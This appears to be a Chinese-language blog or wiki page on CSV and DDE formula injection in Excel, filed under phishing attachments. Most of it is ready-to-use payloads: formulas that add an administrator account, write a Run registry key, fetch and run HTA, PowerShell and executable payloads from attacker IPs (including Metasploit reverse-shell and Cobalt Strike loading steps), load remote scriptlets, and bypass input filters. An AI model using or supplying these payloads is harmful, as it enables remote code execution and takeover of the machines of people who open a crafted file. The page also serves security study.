---
date: 2025-10-09
category:
  - 网络安全
  - 网络钓鱼
tags:
  - 钓鱼附件
  - Office
  - CSV
excerpt: CSV(Comma-Separated Values) 是一种用来存储数据的纯文本格式文件。
---

# CSV

> [office-exploits/injections at master · SecWiki/office-exploits · GitHub](https://github.com/SecWiki/office-exploits/tree/master/injections)
>
> [CSV注入详解 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/12272?time__1311=mqmhD5YIoXqBqDudxUOxAEtKUq0INx&alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-0)

---

## CSV简介

CSV(Comma-Separated Values) 是一种用来存储数据的纯文本格式文件。

CSV文件由任意数目的记录组成，记录间以指定符号(最常见的是逗号,也有用分号,制表符,`|`,空格等分隔的)分隔

例如:

![image-20240710094603740](http://cdn.ayusummer233.top/DailyNotes/202407100946680.png)

---

## CSV注入原理

CSV 注入是一种将包含恶意命令的excel公式插入到可以导出csv或xls等格式的文本中，当在excel中打开csv文件时，文件会转换为excel格式并提供excel公式的执行功能，会造成命令执行问题。

Excel 有一个特性：单元格中的第一个字符是 `+、-、@、=` 这样的符号时，他会以一个表达式的形式被处理

![image-20240710094847973](http://cdn.ayusummer233.top/DailyNotes/202407100948082.png)

不过除了公式之外, `=` 也可以用于执行代码, 这需要涉及到一个概念: [DDE](../DDE/index.md)

动态数据交换（DDE），是Windows下进程间通信协议，支持Microsoft Excel，LibreOffice和Apache OpenOffice。

Excel、Word、RTF、Outlook都可以使用这种机制，根据外部应用的处理结果来更新内容。因此，如果我们制作包含DDE公式的CSV文件，那么在打开该文件时，Excel就会尝试执行外部应用。

---

由于涉及到调用外部应用,加载外部数据, 对于新版本 Office 而言需要在 `文件-选项-信任中心-信任中心设置-外部内容-动态数据交换的安全设置` 中启用 `动态数据交换服务器查找` 和 `动态数据交换服务器启动`

![image-20240710110237136](http://cdn.ayusummer233.top/DailyNotes/202407101102187.png)

---

## 弹计算器

例如

```
=1+cmd|'/C calc'!A0
```

![image-20240710101319768](http://cdn.ayusummer233.top/DailyNotes/202407101014821.png)

![image-20240710101407766](http://cdn.ayusummer233.top/DailyNotes/202407101014623.png)

---

## OS命令执行

可以利用上述方式执行系统命令, 例如

- 打开任意应用程序

  例如打开浏览器访问指定站点

  ```
  =1+cmd|'/C "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" http://100.1.1.131:8090/a'!A0
  ```

- 反弹Shell

- 添加用户

  ```
  =cmd|'/C net user test 123456 /add'!A0+<br>=cmd|'/C net user test 123456 /add && net localgroup administrators test /add'!A0
  ```

- 修改注册表

  ```
  =cmd|'/C reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v calc /t REG_SZ /d c:\windows\system32\calc.exe /f'!A0
  ```

---

## cmd+mshta+msf 反弹Shell

> TODO

`msf`:

```bash
msfconsole
use exploit/windows/misc/hta_server
# 设置srvhost和srvport绑定一个web服务让目标访问
msf exploit(windows/misc/hta_server) > set srvhost 100.1.1.131
# 使用的攻击载荷
set payload windows/x64/meterpreter/reverse_tcp  
#默认是x86的,选择x64
set target 1
# 绑定攻击机IP
set lhost 100.1.1.131
# 启动脚本
run
```

新建csv, 插入如下命令并保存文件

```
=1+cmd|'/C mshta http://100.1.1.102:8080/3Mw1oRtpuxJp.hta'!A0
```

用 Excel 重新打开该 CSV即可上线 msf

---

## PowerShell 上线 CobaltStrike

```
=1+cmd|'/C "powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(\"http://100.1.1.131:8051/b\"))"'!A0
```

---

## CMD + Curl 下载与执行可执行文件

```
=cmd|'/C "curl http://100.1.1.131:8888/artifact_x64.exe --output shell.exe && .\shell.exe"'!A0
```

---

## 超链接钓鱼链接

```
=HYPERLINK("http://10.182.234.102:8090/a","点我百度”")
```

---

## 注册加载远程sct

> [office-exploits/injections at master · SecWiki/office-exploits · GitHub](https://github.com/SecWiki/office-exploits/tree/master/injections)

```csv
fillerText1,fillerText2,fillerText3,=MSEXCEL|'\..\..\..\Windows\System32\regsvr32 /s /n /u /i:http://192.168.154.200/cmd.sct scrobj.dll'!''
```

---

## 加载 scriptlet

> [office-exploits/injections at master · SecWiki/office-exploits · GitHub](https://github.com/SecWiki/office-exploits/tree/master/injections)

```
=Package|'scRiPt:http://XXXX/XXXX.xml'!""
```

---

## 绕过技巧

> [CSV注入详解 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/12272?time__1311=mqmhD5YIoXqBqDudxUOxAEtKUq0INx&alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-0)

---

### 静态

可以通过运算符`+-`的方式绕过对于 `=` 的检测

```
-1+1+cmd |’ /C calc’ !A0
```

参数处输入以下 Payload，`%0A`被解析，从而后面的数据跳转到下一行：

```
%0A-1+1+cmd|' /C calc'!A0
```

导出文件为 csv 时，若系统在等号`=`前加了引号`’`过滤，则可以使用分号绕过，分号`；`可分离前后两部分内容使其分别执行：

```
;-3+3+cmd|' /C calc'!D2
```

其他常用 Payload：

```
@SUM(cmd|'/c calc'!A0)
=HYPERLINK("https://attact.com")
```

---



































